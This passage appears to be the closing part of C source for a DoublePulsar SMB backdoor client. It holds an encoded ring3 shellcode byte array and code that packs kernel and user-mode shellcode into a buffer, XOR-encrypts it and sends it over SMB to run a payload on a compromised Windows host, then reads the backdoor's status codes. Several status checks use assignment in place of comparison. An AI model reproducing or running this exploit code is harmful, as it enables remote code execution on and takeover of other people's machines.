			"\x75\x3d\xe3\x76\x7c\x87\x72\xdd\x90\x57\xe1\xb0\x3f\x1e"
			"\x72\xe3\xe7\xb1\x97\x9c\x72\xd5\x16\xf2\x66\xdc\x62\xf0"
			"\x4f\xd6\xfb\x30\xca\x4f\xea\xac\x46\x5c\x68\xf2\xac\x5f"
			"\x97\xb5\x0f\x07\xb1\x52\xaf\x1d\xab\xfd\x46\x52\xfa\xa6"
			"\x40\x55\xaa\x2d\x5e\x5c\x72\xca\x63\x96\xeb\xdd\x47\xd6"
			"\xea\x31\x71\x55\x54\x34\x4f\x5c\x0e\x5a\x6f\x1c\x7d\xb0"
			"\x3f\x1e\x72\xe3\xe7\xb1\xea\x3c\xc7\xda\x7b\xd3\xe6\x25"
			"\x4b\x88\xff\x9b\x39\x9e\x03\x15\xee\xc4\xdf\xa2\xe2\x8a"
			"\x63\x96\xeb\xd9\x47\xd6\xea\xb4\x66\x96\xa7\xb5\x4a\x5c"
			"\x7a\xce\x6e\x1c\x7b\xbc\x85\xd3\xb2\x9a\x26\xcd\xea\xa5"
			"\x4f\x8f\x64\x8b\x7d\x5c\xf3\xbc\x57\x96\x60\x9a\xa4\xf1"
			"\x8b\xbc\x5c\x28\xda\x8a\x66\x44\xf1\xb5\x85\xc5\xd3\x85"
			"\xd8\xe2\x54\xa0\x46\x6d\x3b\xd2\x27\x1d\xab\xfd\x0e\xd7"
			"\x72\x5f\xaa\x1c\xaa\xfd\x0e\x96\x80\xe3\xac\x72\x2c\x02"
			"\xdb\x6c\xca\x67\x85\x4b\xea\x47\xa8\x42\x87\x4f\xd8\xc8"
			"\xe3\x7e\xca\xff\x06\xd4\x5b\x17\x2b\x06\xee\xa2\x3f\x69"
			"\x60\x0e\xd9\x92\x64\xd7\x63\x93\xae\xc7\x54\x28\x6d\xb6"
			"\x56\xb1\x09\x78\xd3\x98\x0e\xd7\x3a\xd2\x27";

		size_t ring3_len = sizeof(ring3) / sizeof(ring3[0]);
		ring3_len -= 1;

		shellcode_one_part_len = sizeof(shellcode) / sizeof(shellcode[0]);
		shellcode_one_part_len -= 1; //remove NULL terminator

		shellcode_part_two_len = sizeof(shellcode_part_two) / sizeof(shellcode_part_two[0]);
		shellcode_part_two_len -= 1; //remove NULL terminator

		kernel_shellcode_size = shellcode_one_part_len + shellcode_part_two_len + 4;

		printf("Total size of kernel shellcode:  %d\n", kernel_shellcode_size);

		memset(hMem, 0x90, 4096);
		memcpy(hMem, shellcode, shellcode_one_part_len);
		memcpy(hMem + shellcode_one_part_len, &proc_hash, sizeof(proc_hash));
		memcpy(hMem + shellcode_one_part_len + sizeof(proc_hash), shellcode_part_two, shellcode_part_two_len);

		memcpy(hMem + kernel_shellcode_size, &ring3_len, sizeof(uint16_t));
		memcpy(hMem + kernel_shellcode_size + sizeof(uint16_t), ring3, ring3_len);

		/*
		if (EntireShellcodeSize > 4096)
		{
			printf("Your shellcode is too large for our packet to send!\n");
			closesocket(sock);
			WSACleanup();
			exit(1);
		}
		*/

		//might need to make this static due to sizeof being garbage @ counting shellcode
		//unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
		//unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);

		//remove the NULL terminator count
		//kernel_shellcode_size -= 1;
		//payload_shellcode_size -= 1;

		//add +2 to the entire shellcode size because the size of the shellcode ( in bytes ) MUST be appended to the total length
		//unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size + 2;

		//printf("Maximum shellcode size: 4096\n");
		//printf("Size of your shellcode:  %d\n", EntireShellcodeSize);
		//printf("Shellcode is already padded to 4096\n");
		//unsigned int MaxShellcodeSize = 4096;
		//unsigned int difference = MaxShellcodeSize - EntireShellcodeSize;

		//calculate the payload shellcode length
		//WORD wPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);

		//remove the NULL terminator from the shellcode count
		//wPayloadShellcodeSize -= 1;

		memset(SMBDATA->smbdata, 0, 4096);
		memcpy((unsigned char*)SMBDATA->smbdata, (unsigned char*)hMem, 4096);
		//hexDump(0, SMBDATA->smbdata, 4096);

		//copy kernel shellcode to encrypted buffer
		//memcpy((unsigned char*)SMBDATA->smbdata, (unsigned char*)&kernel_shellcode, kernel_shellcode_size);

		//copy the shellcode size after the kernel shellcode
		//memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size, (unsigned char*)&wPayloadShellcodeSize, 2);

		//copy payload shellcode to encrypted buffer
		//memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size + 2, (unsigned char*)&shellcode, payload_shellcode_size);

		//memset(SMBDATA->smbdata + EntireShellcodeSize, 0x90, difference);
		//hexDump(0, SMBDATA->smbdata, 4096);

		//encrypt the data with the XOR key
		for (i = 0; i < 4096; i++)
		{
			SMBDATA->smbdata[i] ^= byte_xor_key[i % 4];
		}

		//hexDump(0, buffer, 4178);

		//printf("Size of buffer:  %d\n", sizeof(buffer));

		send(sock, (char*)buffer, sizeof(buffer), 0);
		recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

		//hexDump(0, hMem, 4096);
		//printf("\n\n\n");
		//hexDump(0, buffer, 4096);

		SMB_TRANS2_RESPONSE* transaction_response = (SMB_TRANS2_RESPONSE*)recvbuff;

		//DoublePulsar response: STATUS_NOT_IMPLEMENTED
		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
		{
			printf("All data sent and got good response from DoublePulsar!\n");
		}

		if (transaction_response->multipleID = 0x52)
		{
			printf("Doublepulsar returned: Success!\n");
		}
		else if (transaction_response->multipleID = 0x62)
		{
			printf("Doublepulsar returned: Invalid parameters!\n");
		}
		else if (transaction_response->multipleID = 0x72)
		{
			printf("Doublepulsar returned: Allocation failure!\n");
		}
		else {
			printf("Doublepulsar execute command failed!\n");
		}
	}
	else {
		printf("Doublepulsar doesn't appear to be installed!\n");
	}
	closesocket(sock);
	WSACleanup();
	return 0;
}
